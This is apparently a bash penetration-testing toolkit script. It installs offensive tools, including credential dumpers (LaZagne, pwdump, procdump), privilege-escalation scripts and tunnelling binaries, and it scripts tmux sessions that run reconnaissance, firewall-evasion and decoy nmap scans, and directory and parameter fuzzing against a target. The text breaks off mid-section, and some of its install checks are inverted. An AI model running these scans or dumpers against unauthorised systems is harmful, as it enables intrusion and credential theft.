#!/bin/bash
# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
source "common"

open_terminal() {
    # Determina il terminale da utilizzare in base al sistema operativo
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --tab -e "$1"
    elif command -v konsole &>/dev/null; then
        konsole --new-tab -e "$1"
    elif command -v xterm &>/dev/null; then
        xterm -e "$1"
    elif command -v qterminal &>/dev/null; then
        qterminal -e "$1"
    else
        # Nessun terminale specifico trovato, apre una nuova finestra di terminale di default
        echo "No specific terminal found. Default terminal opening."
        x-terminal-emulator -e "$1"
    fi
}

while true
do
    echo ""
    echo ""    
    echo "Select actions on [$site]:"
    echo "1. Userful Tool: install usefull tools for penetration test."
    echo "2. Information Gathering: OSINT, Service Information Gathering (nmap), WAF Detection etc."
    echo "3. WEB Information Gathering: WAF detection, site structure, virtual host, etc"
    echo "4. Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc"
    echo "5. Service AuthN bypass: ssh, ftp, smtp,  etc (TBD)"
    echo "6. WEB Service AuthN bypass: brute force, command injection, webDAV, etc"
    read -p "Enter the number of the desired action (0 to exit): " choice





    case $choice in
        0)
            echo "Exit from tool."
            break
            ;;
        1)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEAPONIZATION
######################
######################
#XXX open_terminal "bash -c 'echo WEAPONIZATION; sleep 2;"
# Parametri
folderLin="/opt/_lin"
folderWin="/opt/_win"

# Funzione per verificare se un programma è installato
is_installed() {
    local program="$1"
    if command -v "$program" &> /dev/null; then
	return 0 # Installato
    else
	return 1 # Non installato
    fi
}


# ===
# === APPLICAZIONI DA INSTALLARE SU KALI
# ===

echo " ==="
echo " === Utilità da installare su Kali ==="
echo " ==="
# aggiornamento apt
sudo apt update

# seclists
program="seclists"
echo ""
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /usr/share
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# impacket
echo ""
program="python3-impacket"
pathAppo="/usr/share/doc/python3-impacket/examples"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
fi

# impacket
echo ""
program="nishang"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# mingw-w64
echo ""
program="mingw-w64"
if ! is_installed "i686-w64-mingw32-gcc"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# script nmap
echo ""
program="nmap script (vulnscan, vulners)"
pathAppo="/usr/share/nmap/scripts/vulscan"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /usr/share/nmap/scripts/
	sudo git clone https://github.com/vulnersCom/nmap-vulners.git
	sudo git clone https://github.com/scipag/vulscan.git
	cd /usr/share/nmap/scripts/vulscan/
	chmod +x update.sh
	sudo ./update.sh
fi

#Nessus
echo ""
program="Nessus 10.6.3"
cd /opt
if [ -e "Nessus-10.6.3-ubuntu1404_amd64.deb" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.6.3-ubuntu1404_amd64.deb' --output 'Nessus-10.6.3-ubuntu1404_amd64.deb'
	sudo dpkg -i Nessus-10.6.3-ubuntu1404_amd64.deb
fi

# kitrunner (analisi API)
echo ""
program="Kitrunner"
cd /opt
if [ -e "kr" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_386.tar.gz
	sudo gunzip kiterunner_1.0.2_linux_386.tar.gz
	sudo tar -xvf kiterunner_1.0.2_linux_386.tar 
	sudo chmod 755 ./kr
fi


# uniscan (automatizzo il command injection)
echo ""
program="uniscan"
cd /opt
if ! is_installed "uniscan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install uniscan
fi

# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
echo ""
program="juumla"
cd /opt
if ! is_installed "juumla"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/oppsec/juumla.git
fi

# droopescan (automatizzo l'analisi delle vulnerabilità di drupal)
echo ""
program="droopescan"
cd /opt
if ! is_installed "droopescan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install droopescan 
fi


# wisker / cupp (automatizzo la creazione di un dizionario)
echo ""
program="wisker"
if ! is_installed "wisker"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install wisker 
fi
program="cupp"
if ! is_installed "cupp"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install cupp
fi


# cmsmap (bruteforce su Joomla, WOrdpress e Drupal)
echo ""
program="cmsmap"
cd /opt
if ! is_installed "droopescan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo  git clone https://github.com/Dionach/CMSmap
	cd /opt/CMSmap 
	sudo pip3 install .
fi



# dirsearch (search directory)
echo ""
program="dirsearch"
cd /opt
if ! is_installed "dirsearch"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install dirsearch
fi


# whatwaf (WAF detection)
echo ""
program="whatweb"
cd /opt
if ! is_installed "whatweb"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo git clone https://github.com/Ekultek/WhatWaf.git
	cd /opt/WhatWaf 
	sudo pip3 install -r requirements.txt
	sudo python setup.py install
fi


# Synk e copilot
echo ""
echo "[A] Synk e Copilot non possono essere installati in automatico"
echo "    Per installarli vedi githib di ippsec"
echo "    https://github.com/IppSec/parrot-build"


# Docker
echo ""
program="Docker"
cd /opt
if [ -e "docker" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo sudo apt install docker.io -y
fi


# hakluke/hakrawler
echo ""
program="hakluke/hakrawler"
cd /opt
if [ -d "/opt/hakrawler" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/hakrawler
	cd /opt/hakrawler
	sudo git clone https://github.com/hakluke/hakrawler
	cd hakrawler
	sudo docker build -t hakluke/hakrawler .
fi


# sxcurity/gau
echo ""
program="sxcurity/gau"
cd /opt
if [ -d "/opt/gau" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/gau
	sudo docker run --rm sxcurity/gau:latest --help
fi


# sublist3r (OSINT: subdomain)
echo ""
program="sublist3r"
cd /opt
if [ -e "sublist3r" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install sublist3r
fi


# spiderfoot (OSINT: info)
echo ""
program="spiderfoot"
cd /opt
if [ -e "spiderfoot" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install spiderfoot
fi


# metagoofil (OSINT: meta info)
echo ""
program="metagoofil"
cd /opt
if [ -e "metagoofil" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install metagoofil
fi






# ===
# === APPLICAZIONI PER TARGET LINUX
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Linux ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderLin" ]; then
    mkdir -p "$folderLin"
    echo "[i] Cartella $folderLin creata con successo"
else
    echo "[i] La cartella $folderLin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderLin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nping
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_386.gz
https://github.com/hugsy/gdb-static/raw/master/gdb-7.10.1-x32
EOF
# Scarica i file utilizzando wget
echo ""
echo "[i] download applicativi"
wget -N -i download.txt

#completo l'installazione di chisel
echo ""
echo "[i] Completo l'installazione di chisel"
sudo gunzip chisel_1.7.4_linux_386.gz 
sudo mv chisel_1.7.4_linux_386 chisel 
sudo chmod 755 *
sudo upx brute chisel


# Installo applicazioni per analisi SMB: crackmap, impacket
echo ""
echo "[i] Installazione applicazioni per analisi SMB: crackmap, impacket"
cd /opt/
sudo apt-get install crackmapexec
sudo apt-get install python3-impacket









# ===
# === APPLICAZIONI PER TARGET WINDOWS
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Windows ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderWin" ]; then
    mkdir -p "$folderWin"
    echo "[i] Cartella $folderWin creata con successo"
else
    echo "[i] La cartella $folderWin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderWin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEAS.bat
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx86.exe
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nmap.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nping.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_windows_386.gz
EOF
# Scarica i file utilizzando wget
echo ""
echo "[i] download applicativi"
wget -N -i download.txt

#completo l'installazione di chisel
echo ""
echo "[i] Completo l'installazione di chisel"
sudo gunzip chisel_1.7.4_windows_386.gz 
sudo mv chisel_1.7.4_windows_386 chisel.exe 
sudo upx brute chisel.exe

# SharpCollection
echo ""
echo "[i] Installazione di sharpCollection"
sudo git clone https://github.com/Flangvik/SharpCollection.git

# samdump, pwdump, procdump
#SAMDUMP2
echo ""
echo "[i] Installazione di samdump2"
sudo apt install samdump2
# PWDUMP
echo ""
echo "[i] Installazione di Pwdump"
sudo wget -N https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
sudo unzip -o pwdump8-8.2.zip
sudo chmod 755 ./pwdump8
sudo chmod 755 ./pwdump8/*
# PROCDUMP
echo ""
echo "[i] Installazione di ProcDump"
sudo wget -N https://download.sysinternals.com/files/Procdump.zip
sudo unzip -o Procdump.zip
sudo chmod 755 *
;;

            
            
            
            
            

        2)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Information Gathering: OSINT from web (synapsint, crt), from cmd (dmitry, theharvester) and service information gathering (nmap) etc."
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter


# INFORMATION GATHERING
cd $folderProjectInfoGathering
# OSINT from WEB interesting (synopsint, crt) and other ()
# Layout
tmux new-window -t PT:1 -n 'OSINT from web interesting and other stuff'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# OSINT from web interesting stuff" Enter
tmux send-keys -t PT:1.0 "grep -v '^#' $folderProjectEngine/osint-web-interesting.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:1.1 "# OSINT from web other stuff" Enter
tmux send-keys -t PT:1.1 "grep -v '^#' $folderProjectEngine/osint-web-other.txt | xargs -I {} xdg-open {}" 
cd $folderProject


cd $folderProjectInfoGathering
# OSINT from CMD (Dmitry, Theharvester, ping / nmap, nslookup, ecc)
# Layout
tmux new-window -t PT:2 -n 'OSINT from cmd (dmitry, theharvester ...)'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux split-window -v -t PT:2.2
tmux split-window -v -t PT:2.3
tmux select-pane -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
tmux select-pane -t "2.4"
tmux split-window -h -t "2.4"
tmux split-window -h -t "2.4"
tmux split-window -h -t "2.4"
tmux select-pane -t "2.8"
tmux split-window -h -t "2.8"
tmux split-window -h -t "2.8"
tmux split-window -h -t "2.8"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# sublist3r (subdomain)" Enter
tmux send-keys -t PT:2.0 "sublist3r -d $domain"
tmux send-keys -t PT:2.1 "# ping (OS)" Enter
tmux send-keys -t PT:2.1 "ping -c 4 $ip"
tmux send-keys -t PT:2.2 "# nmap (OS)" Enter
tmux send-keys -t PT:2.2 "sudo nmap -Pn -O $ip"
tmux send-keys -t PT:2.3 "# whois (domain)" Enter
tmux send-keys -t PT:2.3 "whois $domain"
tmux send-keys -t PT:2.4 "# Advanced DNS All-in-One (dnsrecon - fierce)" Enter
tmux send-keys -t PT:2.4 "dnsrecon -d $domain & fierce --domain $domain"
tmux send-keys -t PT:2.5 "# host (DNS)" Enter
tmux send-keys -t PT:2.5 "host -t a $site && host -t aaaa $site && host -t mx $site && host -t ns $site && host -t ptr $ip"
tmux send-keys -t PT:2.6 "# Zone Transfer (dig)" Enter
tmux send-keys -t PT:2.6 "dig axfr $domain"
tmux send-keys -t PT:2.7 "# nslookup IP - Site (DNS)" Enter
tmux send-keys -t PT:2.7 "nslookup $ip & nslookup $site"
tmux send-keys -t PT:2.8 "# dmitry (info)" Enter
tmux send-keys -t PT:2.8 "dmitry -news $domain -o $folderProjectInfoGathering/dmitry.txt"
tmux send-keys -t PT:2.9 "# theHarvester (info)" Enter
tmux send-keys -t PT:2.9 "theHarvester -d $domain -b all -l 500 -f $folderProjectInfoGathering/theharvester.html"
tmux send-keys -t PT:2.10 "# spiderfoot (info)" Enter
tmux send-keys -t PT:2.10 "firefox 127.0.0.1:8083 & spiderfoot -l 127.0.0.1:8083 "
tmux send-keys -t PT:2.11 "# metagoofil (metainfo: pdf, doc, xls, ppt, docx, pptx, xlsx) -> exiftool <file>" Enter
tmux send-keys -t PT:2.11 "metagoofil -d $domain -t pdf -l 100 -n 25 -f $folderProjectInfoGathering/metagoofil-result.txt -o $folderProjectInfoGathering/"
cd $folderProject


cd $folderProjectInfoGathering
# nmap
# Layout
tmux new-window -t PT:3 -n 'nmap: Service analysis'
tmux split-window -v -t PT:3.0
tmux split-window -v -t PT:3.1
tmux split-window -v -t PT:3.2
tmux select-pane -t "3.2"
tmux split-window -h -t "3.2"
tmux split-window -h -t "3.2"
# Esecuzione dei comandi nelle sottofinestre
# NMAP TCP - UDP
tmux send-keys -t PT:3.0 "# nmap (TCP) WITHOUT firewall evasion" Enter
tmux send-keys -t PT:3.0 "sudo nmap -sV -sC -O -vv -p- -T5 $ip -Pn -oA out.TCP"
tmux send-keys -t PT:3.1 "# nmap (UDP)" Enter
tmux send-keys -t PT:3.1 "sudo nmap -sU -Pn -p 53,69,123,161,1985,777,3306 -T5 $ip -oA out.UDP"
tmux send-keys -t PT:3.2 "# nmap (on specific port)" Enter
tmux send-keys -t PT:3.2 "sudo nmap -Pn --script vuln --script firewall-bypass $ip -oA out.SPEC -p <ports>"
tmux send-keys -t PT:3.3 "# nmap (on specific port - vulners)" Enter
tmux send-keys -t PT:3.3 "sudo nmap --script nmap-vulners/ -sV $ip -oA out.SPEC.vulners -p <ports>"
tmux send-keys -t PT:3.4 "# nmap (on specific port - vulscan)" Enter
tmux send-keys -t PT:3.4 "sudo nmap --script vulscan/ -sV $ip -oA out.SPEC.vulscan -p <ports>"
tmux send-keys -t PT:3.5 "# nmap (TCP) WITH firewall evasion" Enter
tmux send-keys -t PT:3.5 "sudo nmap -sV -sC -O -vv -p- -T5 --script firewall-bypass $ip -Pn -oA out.TCP"
cd $folderProject


cd $folderProjectInfoGathering
# firewall detection
# Layout
tmux new-window -t PT:4 -n 'Firewall detection'
tmux split-window -v -t PT:4.0
tmux split-window -v -t PT:4.1
tmux split-window -v -t PT:4.2
tmux split-window -v -t PT:4.3
tmux select-pane -t "4.1"
tmux split-window -h -t "4.1"
# Esecuzione dei comandi nelle sottofinestre
# FIREWALL DETECTION
tmux send-keys -t PT:4.0 "# nmap (SYN + ACK). UNFILTERED -> FW stateless; FILTERED -> FW steteful" Enter
tmux send-keys -t PT:4.0 "sudo nmap -sS $ip -Pn && sudo nmap -sA $ip -Pn"
tmux send-keys -t PT:4.1 "# nmap (firewalk)" Enter
tmux send-keys -t PT:4.1 "sudo nmap --script=firewalk --traceroute $ip"
tmux send-keys -t PT:4.2 "# nmap (waf-detection)" Enter
tmux send-keys -t PT:4.2 "nmap --script=http-waf-detect $ip -Pn -p 80"
tmux send-keys -t PT:4.3 "# wafw00f" Enter
tmux send-keys -t PT:4.3 "wafw00f -va $site"
tmux send-keys -t PT:4.4 "# firewalk" Enter
tmux send-keys -t PT:4.4 "firewalk -S1-1024 -i <interface> -n -pTCP <gateway IP> $ip"
cd $folderProject

cd $folderProjectInfoGathering
# nmap with firewall
# Layout
tmux new-window -t PT:5 -n 'Nmap trough Firewall'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
tmux split-window -v -t PT:5.2
tmux split-window -v -t PT:5.3
# Esecuzione dei comandi nelle sottofinestre
# NMAP THROUGH FIREWALL
tmux send-keys -t PT:5.0 "# snmap (ource port 80)" Enter
tmux send-keys -t PT:5.0 "sudo nmap -g 80 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.TCP.s80"
tmux send-keys -t PT:5.1 "# nmap (decoy)" Enter
tmux send-keys -t PT:5.1 "sudo nmap -D 216.58.212.67,66.196.86.81,me,46.228.47.115,104.28.6.11,104.27.163.229,198.84.60.198,192.124.249.8 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.TCP.decoy"
tmux send-keys -t PT:5.2 "# nmap (SYN + FIN)" Enter
tmux send-keys -t PT:5.2 "sudo nmap -sS --scanflags SYNFIN $ip"
tmux send-keys -t PT:5.3 "# nmap (slowly)" Enter
tmux send-keys -t PT:5.3 "sudo nmap -T2 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.TCP.slow"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;
            
            




            
            
            
        3)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB Information Gathering: WAF detection, site structure, virtual host, etc
######################
######################

# XXX open_terminal "bash -c 'echo WEB APP: site fingerprint; sleep 2;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter

cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:1 -n 'WEB Site Structure'
tmux split-window -v -t PT:1.0  
tmux split-window -v -t PT:1.1 
tmux split-window -v -t PT:1.2 
tmux split-window -v -t PT:1.3 
tmux select-pane -t "1.2"
tmux split-window -h -t "1.2"
tmux split-window -h -t "1.2"
tmux select-pane -t "1.5"
tmux split-window -h -t "1.5"
# Esecuzione dei comandi nelle sottofinestre
# WGET standard file
tmux send-keys -t PT:1.0 "# get common file (robots, sitemap, ...)" Enter
tmux send-keys -t PT:1.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crosssite.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"""
# Gobuster, dirsearch
tmux send-keys -t PT:1.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n # search dictionary"
tmux send-keys -t PT:1.2 "# find site structure" Enter
tmux send-keys -t PT:1.2 "# Remeber also that:" Enter
tmux send-keys -t PT:1.2 "# 1. HTTP PUT -> webDav" Enter
tmux send-keys -t PT:1.2 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
tmux send-keys -t PT:1.2 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
tmux send-keys -t PT:1.2 "# site folder structure." Enter
tmux send-keys -t PT:1.2 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:1.3 "# if target site respond always 20x" Enter
tmux send-keys -t PT:1.3 "fuff -u http://$site/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
tmux send-keys -t PT:1.4 "# if target site respond always 30x" Enter
tmux send-keys -t PT:1.4 "gobuster dir -u http://$site -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
tmux send-keys -t PT:1.5 "# dirsearch to find hidden folder (BIG search)" Enter
tmux send-keys -t PT:1.5 "# find site structure" Enter
tmux send-keys -t PT:1.5 "# Remeber also that:" Enter
tmux send-keys -t PT:1.5 "# 1. HTTP PUT -> webDav" Enter
tmux send-keys -t PT:1.5 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
tmux send-keys -t PT:1.5 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
tmux send-keys -t PT:1.5 "dirsearch -u http://$site /usr/share/wordlists/dirb/big.txt"
tmux send-keys -t PT:1.6 "# dirsearch to find hidden folder" Enter
tmux send-keys -t PT:1.6 "# find site structure" Enter
tmux send-keys -t PT:1.6 "# Remeber also that:" Enter
tmux send-keys -t PT:1.6 "# 1. HTTP PUT -> webDav" Enter
tmux send-keys -t PT:1.6 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
tmux send-keys -t PT:1.6 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
tmux send-keys -t PT:1.6 "dirsearch -u http://$site"
cd $folderProject



# WEB Virtual Host
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:2 -n 'WEB Virtual Host'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# find a valid dictionary" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:2.1 "# site virtual host" Enter
tmux send-keys -t PT:2.1 "wfuzz -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 178"
cd $folderProject


# WEB Metodi Attivi
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:3 -n 'WEB Metodi Attivi'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# HTTP method allowed" Enter
tmux send-keys -t PT:3.0 "URL=\"http://$site\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
cd $folderProject


# WEB Estensione File
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:4 -n 'WEB Estensione File'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# find files with multiple extension" Enter
tmux send-keys -t PT:4.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 http://$site/FUZZFUZ2Z"
cd $folderProject


# WEB API
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:5 -n 'WEB API'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
tmux split-window -v -t PT:5.2
tmux split-window -v -t PT:5.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# find kr dictionary" Enter
tmux send-keys -t PT:5.0 "/opt/kr wordlist list"
tmux send-keys -t PT:5.1 "# find endPoint with kr" Enter
tmux send-keys -t PT:5.1 "/opt/kr scan http://$site -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
tmux send-keys -t PT:5.2 "# find endPoint with wfuzz" Enter
tmux send-keys -t PT:5.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ --hc 403,404 # find endpoint manually"
tmux send-keys -t PT:5.3 "# analyze endPoint with curl " Enter
tmux send-keys -t PT:5.3 "curl -X POST http://$site/api/v1/user # play with version"


# Guessing GET / POST Parameter
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:6 -n 'Guessing GET/POST param'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
tmux split-window -v -t PT:6.2
tmux split-window -v -t PT:6.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# find a valid parameter (GET)" Enter
tmux send-keys -t PT:6.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?FUZZ=test"
tmux send-keys -t PT:6.1 "# find a valid value (GET)" Enter
tmux send-keys -t PT:6.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?Param1=FUZZ"
tmux send-keys -t PT:6.2 "# find a valid parameter (POST)" Enter
tmux send-keys -t PT:6.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&FUZZ=1" http://$site/action.php"
tmux send-keys -t PT:6.3 "# find a valid value (POST)" Enter
tmux send-keys -t PT:6.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&Param1=FUZZ" http://$site/action.php"


# WEB Site Info
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:7 -n 'WEB Site Info'
tmux split-window -v -t PT:7.0
tmux split-window -v -t PT:7.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# get favicon and its creation date" Enter
tmux send-keys -t PT:7.0 "wget http://$site/images/favicon.ico; exiftool favicon.ico"
tmux send-keys -t PT:7.1 "# cookie analysis to get information about site framework " Enter
tmux send-keys -t PT:7.1 "curl -s -I http://$site"
cd $folderProject

# WAF Detection
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:8 -n 'WAF Detection'
tmux split-window -v -t PT:8.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# WAF Detection (whatwaf)" Enter
tmux send-keys -t PT:8.0 "sudo whatwaf -u http://$site"
cd $folderProject


# Site crowler
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:9 -n 'Site Crowler'
tmux split-window -v -t PT:9.0
tmux split-window -v -t PT:9.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# Site Crowler Passive (sxcurity/gau)" Enter
tmux send-keys -t PT:9.0 "sudo docker run --rm -i sxcurity/gau $domain --subs"
tmux send-keys -t PT:9.1 "# Site Crowler Active (hakluke/hakrawler)" Enter
tmux send-keys -t PT:9.1 "echo https://$site | sudo docker run --rm -i hakluke/hakrawler -subs"
cd $folderProject


# WEB nmap whois
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:10 -n 'WEB nmap whois'
tmux split-window -v -t PT:10.0  
tmux split-window -v -t PT:10.1 
tmux split-window -v -t PT:10.2 
tmux split-window -v -t PT:10.3 
tmux select-pane -t "10.2"
tmux split-window -h -t "10.2"
tmux split-window -h -t "10.2"
tmux select-pane -t "10.5"
tmux split-window -h -t "10.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:10.0 "# nmap on 80 port" Enter
tmux send-keys -t PT:10.0 "nmap -Pn -sC -sV -T4 -p 80 $ip -oA out.80.infoGathering"
tmux send-keys -t PT:10.1 "# nmap pm 80 port with specific script" Enter
tmux send-keys -t PT:10.1 "nmap -Pn -vv -p 80 --script=http-* $ip -oA out.80.InfoGathering-script"
tmux send-keys -t PT:10.2 "# GET normal request" Enter
tmux send-keys -t PT:10.2 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:10.3 "# GET error request" Enter
tmux send-keys -t PT:10.3 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:10.4 "# GET error request" Enter
tmux send-keys -t PT:10.4 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:10.5 "# whois domain" Enter
tmux send-keys -t PT:10.5 "whois $domain"
tmux send-keys -t PT:10.6 "# whois IP" Enter
tmux send-keys -t PT:10.6 "whois $ip"
cd $folderProject


# WEB Analisi del certificato HTTPS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:11 -n 'WEB Certificato HTTPS'
tmux split-window -v -t PT:11.0
tmux split-window -v -t PT:11.1
# Esecuzione dei comandi nelle sottofinestre
